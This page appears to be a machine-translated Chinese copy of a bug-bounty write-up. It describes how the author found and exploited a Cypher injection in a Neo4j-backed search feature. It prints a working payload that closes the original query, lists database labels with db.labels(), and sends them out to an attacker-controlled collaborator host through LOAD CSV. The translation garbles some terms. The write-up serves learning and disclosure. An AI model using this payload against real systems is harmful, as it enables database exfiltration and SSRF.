<html>
<head>
<title>The most underrated injection of all time — CYPHER INJECTION. Identification &amp; Exploitation!</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">有史以来最被低估的注射剂——赛佛注射剂。识别和开发！</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8?source=collection_archive---------0-----------------------#2022-12-04">https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8?source=collection_archive---------0-----------------------#2022-12-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/006eccb097206a656a2fb3bd4270c4ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:600/format:webp/1*epI9yuMC8O5cPZyJo9A5rA.jpeg"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">表情包</figcaption></figure><blockquote class="jy jz ka"><p id="1cf7" class="kb kc kd ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">背景</strong></p></blockquote><p id="5521" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">Cypher是Neo4j的图形查询语言，允许您从图形中检索数据。它就像是图形的SQL，并且受到SQL的启发。</p><p id="1db9" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">Neo4j是一个图形数据库管理系统，它使用cypher作为其主要语言从图形中查询数据，就像mySQL(这是一个关系数据库管理系统)使用SQL作为其主要语言从表中查询数据一样。</p><p id="354b" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated"><a class="ae ld" href="https://neo4j.com/developer/cypher/" rel="noopener ugc nofollow" target="_blank">这里有更多关于cypher &amp; neo4j的信息</a> …</p><blockquote class="jy jz ka"><p id="6943" class="kb kc kd ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">查找bug </strong></p></blockquote><p id="50bc" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">我黑进了HackerOne上的一个私人程序。到那时，我已经在那里发现了一些高严重性的错误。该计划在范围内有两个pentest租户，并为每个租户提供了凭据。每个租户都有几个组织，并且凭证允许访问一些组织。每个租户都有一个很少使用的搜索功能(搜索其下的组织)。我去了burp suite，看到了搜索功能生成的请求。我习惯在搜索词的末尾附加一个单引号( ' )，没有任何期望。但令我惊讶的是，服务器返回了一个错误—</p><figure class="lf lg lh li gt jr gh gi paragraph-image"><div class="gh gi le"><img src="../Images/af697241070a15de5653c4df3212f7a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:764/format:webp/1*px-VQtZXLWbb2f0xevwb_A.png"/></div></figure><p id="ce94" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">(不是完全的错误，但它是这样开始的，我发现这个错误时，我对错误奖金非常陌生，从未考虑过保留任何错误的截图)这是我第一次看到这样的错误，我复制了开始的部分，并在谷歌上搜索。从那里我了解了neo4j数据库和什么是密码。Cypher非常像sql，因此我在google上搜索的下一个东西是“cypher injection”(因为基于sql的注入被称为sql injection)。关于这个bug的文章很少，明智的做法是几乎没有2-3篇文章。我把它们都读了一遍，并有了一个如何利用它们的想法。我花了两天时间为易受攻击的目标开发有效载荷。我在谷歌上得到的信息肯定有基本的有效载荷，但这些没有直接工作。我不得不关闭一些引号、不完整的条件、方括号并最终部分完成现有查询(以便整体查询正常工作)以最终爆发并使其具有恶意。这是我得出的最后一个有效载荷</p><p id="99c1" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated"><code class="fe lj lk ll lm b">.*' | o ] AS filteredOrganisations CALL db.labels() YIELD label LOAD CSV FROM 'http://&lt;collaborator-url-here&gt;/' + label AS r //</code></p><blockquote class="jy jz ka"><p id="bdbd" class="kb kc kd ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">有效载荷的说明</strong></p></blockquote><p id="06a4" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated"><code class="fe lj lk ll lm b">.*' | o ] AS filteredOrganisations</code></p><p id="38c9" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">这整个部分是为了部分关闭当前查询。上面的部分部分关闭了当前查询，并帮助向原始查询添加了新的子句。</p><p id="565b" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated"><code class="fe lj lk ll lm b">CALL db.labels() YIELD label</code></p><p id="5dd1" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">CALL子句用于计算子查询，这里子查询调用db.labels()，这是一个内置过程，它返回数据库中使用的所有标签的列表。YIELD子句将返回的列表存储在变量“label”中。</p><p id="e565" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated"><code class="fe lj lk ll lm b">LOAD CSV FROM 'http://&lt;collaborator-url-here&gt;/' + label AS r //</code></p><p id="165e" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">LOAD CSV是一个子句，用于通过from关键字从用户定义的位置加载CSV文件。这里，LOAD CSV向我们的burp collaborator客户端发出请求，一次附加一个列表元素“label”。结果，多个请求被发送到我的burp collaborator客户端，并且所有请求都在请求的端点上附加了不同的标签名称。使用结尾部分“AS r”只是因为没有它，查询会不断中断，它所做的只是将csv文件作为“r”加载，最后两个正斜杠“//”用于注释掉同一行中查询的其余部分。</p><p id="3be4" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">所有这些部分结合起来形成了有效载荷，帮助我创建了一个基本的概念验证</p><blockquote class="jy jz ka"><p id="94f1" class="kb kc kd ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">剥削</strong></p></blockquote><p id="e86d" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">总的剥削看起来是这样的—</p><figure class="lf lg lh li gt jr"><div class="bz fp l di"><div class="ln lo l"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">原始剥削</figcaption></figure><p id="d789" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">对不起，伙计们的水印，它仍然是可见的。我只是想分享整个原始剥削概念。我不编辑视频，因此不想购买他们的订阅，但隐藏域名很重要，所以无论如何都要编辑它。</p><blockquote class="jy jz ka"><p id="fa50" class="kb kc kd ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">结论</strong></p></blockquote><p id="253d" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">当我创建了上面的poc后，我非常兴奋，因为这将是我的第一个涉及到注射和ssrf的关键bug。我很快报告了这个错误。第二天，我试图利用它，但由于某种原因，我的基本检测有效载荷根本不工作。很快我意识到这个问题已经解决了。根本没有通知我。当时令人沮丧，但几个小时后，团队成员承认了这个错误，并以他们提供的最高奖金奖励了我。</p><figure class="lf lg lh li gt jr gh gi paragraph-image"><div class="gh gi lp"><img src="../Images/f56444d2b71387ea82f082b273dfa727.png" data-original-src="https://miro.medium.com/v2/resize:fit:716/format:webp/1*aFY6YATk-OcsA3dRmwG7eg.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">慷慨</figcaption></figure><blockquote class="jy jz ka"><p id="3f8f" class="kb kc kd ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">外卖</strong></p></blockquote><p id="eda2" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">现在不会用常识来烦你了。它只是做研究，谷歌的东西和使用常识。以我为例，在我了解到cypher是一种类似于sql的语言(或者说是受sql启发)之后，搜索“cypher injection”纯粹是常识。</p><p id="9729" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">阅读文档。老实说，我读了很多关于cypher和neo4j的东西，然后能够提出有效载荷。有效负载非常简单，我使用的方法已经可以在互联网上获得，但要应用有效负载，我首先必须知道密码查询是如何工作的，并正确地分析易受攻击的目标。</p><blockquote class="jy jz ka"><p id="6a28" class="kb kc kd ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">简单介绍一下自己</strong></p></blockquote><p id="3d4f" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">老实说，到目前为止这是我找到的唯一的关键。我确实经常发现严重程度高的错误，但是严重错误有不同的情况。有很多次，我认为我找到了一个关键，甚至设法让我的报告被归类为关键(在少数情况下)，但最终由于一些复杂性，它总是归结为高或中。我会说，不要急于求成，有时高和中等一起可以让你赚一些钱。明年我一定会努力工作，找到一些令人惊奇的bug，希望能找到一些关键的bug(至少几个)。我已经认真地开始寻找bug一年了，就我所拥有的金钱、独立和时间而言，这是一段不可思议的旅程。我不是专业人士，这只是我想分享的一个很酷的发现: )</p><p id="090b" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">如果你已经读到这里，那么谢谢你。我希望这是值得的，你学到了新的东西。</p><p id="7b5f" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">在linkedin上关注我—<a class="ae ld" href="https://www.linkedin.com/in/marvelmaniac/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/marvelmaniac/</a></p><p id="70de" class="pw-post-body-paragraph kb kc iq ke b kf kg kh ki kj kk kl km la ko kp kq lb ks kt ku lc kw kx ky kz ij bi translated">在推特上关注我——https://twitter.com/maniacmarvel_<a class="ae ld" href="https://twitter.com/maniacmarvel_" rel="noopener ugc nofollow" target="_blank"/></p></div><div class="ab cl lq lr hu ls" role="separator"><span class="lt bw bk lu lv lw"/><span class="lt bw bk lu lv lw"/><span class="lt bw bk lu lv"/></div><div class="ij ik il im in"><h2 id="1b31" class="lx ly iq bd lz ma mb dn mc md me dp mf la mg mh mi lb mj mk ml lc mm mn mo mp bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ld" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周时事通讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>